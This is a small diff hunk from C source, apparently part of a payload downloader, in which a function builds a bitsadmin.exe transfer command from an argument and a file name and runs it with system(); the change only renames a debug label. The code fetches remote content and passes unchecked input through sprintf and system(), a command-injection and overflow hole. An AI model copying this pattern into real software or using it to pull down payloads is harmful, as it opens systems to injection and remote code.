@@ -22,7 +22,7 @@ unsigned char *download_bitsadmin(char *arg1, int *data_size) {
     char download[500];    // how not to do it...
     sprintf(download, "bitsadmin.exe /transfer \"WinBitsJob\" %s %s", arg1, sh_filename);
 
-    DEBUG_PRINT("url: %s\n", download);
+    DEBUG_PRINT("command: %s\n", download);
     system(download);
     DEBUG_PRINT("Download done.\n");
 
